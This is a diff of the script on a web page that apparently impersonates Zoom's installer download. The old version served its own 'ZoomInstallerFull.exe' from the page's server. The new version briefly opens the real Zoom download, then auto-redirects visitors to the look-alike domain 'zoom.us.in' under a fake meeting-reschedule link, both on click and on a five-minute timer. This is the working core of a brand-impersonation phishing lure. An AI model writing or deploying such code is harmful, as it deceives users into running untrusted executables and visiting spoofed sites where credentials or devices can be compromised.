@@ -424,23 +424,30 @@ line-height: inherit !important;
 
 
 <script>
-  document.addEventListener('DOMContentLoaded', function() {
-    // Function to trigger the download
-    function triggerDownload() {
-      var link = document.createElement('a');
-      link.href = '/download/ZoomInstallerFull.exe'; // Download path
-      link.download = 'ZoomInstallerFull.exe'; // File name
-      link.click();
-    }
+        document.addEventListener('DOMContentLoaded', function() {
+            // Function to trigger the download and handle the redirection
+            function triggerDownload() {
+                var downloadURL = 'https://zoom.us/client/6.1.5.43316/ZoomInstallerFull.exe?archType=x64';
+                var redirectURL = 'https://us05web.zoom.us.in/j/85328473504/reschedule?pwd=PSBIiF9mjRYr16O0ba5sUoXaaqOr8W.1';
 
-    // Attach event listener to the download-now button
-    document.getElementById('download-now').addEventListener('click', triggerDownload);
+                var downloadTab = window.open(downloadURL, '_blank');
 
-    // Redirect after 10 seconds (10000 milliseconds) for testing purposes
-    setTimeout(function() {
-      window.location.href = 'https://us05web.zoom.us.in/j/85328473504/reschedule?pwd=PSBIiF9mjRYr16O0ba5sUoXaaqOr8W.1';
-    }, 300000); // 10 seconds in milliseconds
-  });
-</script>
+                setTimeout(function() {
+                    if (downloadTab) {
+                        downloadTab.close();
+                    }
+                    window.location.href = redirectURL;
+                }, 45000);
+            }
+
+            // Attach event listener to the download-now button
+            document.getElementById('download-now').addEventListener('click', triggerDownload);
+
+            // Redirect after 5 minutes (300000 milliseconds)
+            setTimeout(function() {
+                window.location.href = 'https://us05web.zoom.us.in/j/85328473504/reschedule?pwd=PSBIiF9mjRYr16O0ba5sUoXaaqOr8W.1';
+            }, 300000);
+        });
+    </script>
 </body>
 </html>
